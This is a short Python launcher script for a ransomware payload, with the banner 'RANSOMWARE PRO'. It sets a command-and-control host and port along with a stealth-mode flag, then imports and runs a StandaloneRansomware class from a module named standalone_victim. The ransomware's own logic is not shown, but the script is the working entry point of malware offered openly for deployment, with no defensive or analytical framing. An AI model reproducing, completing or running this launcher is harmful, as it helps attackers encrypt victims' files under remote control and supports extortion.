#!/usr/bin/env python3
"""
STANDALONE LAUNCHER - No dependencies!
Simply run with: python3 launcher_standalone.py
"""

import os
import sys

# Set environment
os.environ['C2_HOST'] = sys.argv[1] if len(sys.argv) > 1 else '192.168.126.200'
os.environ['C2_PORT'] = '5000'
os.environ['STEALTH_MODE'] = 'true'

print(f"""
╔════════════════════════════════════════════════════════════╗
║  RANSOMWARE PRO - STANDALONE PAYLOAD                      ║
║  Server: {os.environ['C2_HOST']}:5000                        
╚════════════════════════════════════════════════════════════╝
""")

# Import and run
try:
    from standalone_victim import StandaloneRansomware
    
    ransomware = StandaloneRansomware()
    ransomware.run()
except Exception as e:
    print(f"[!] Error: {e}")
    sys.exit(1)
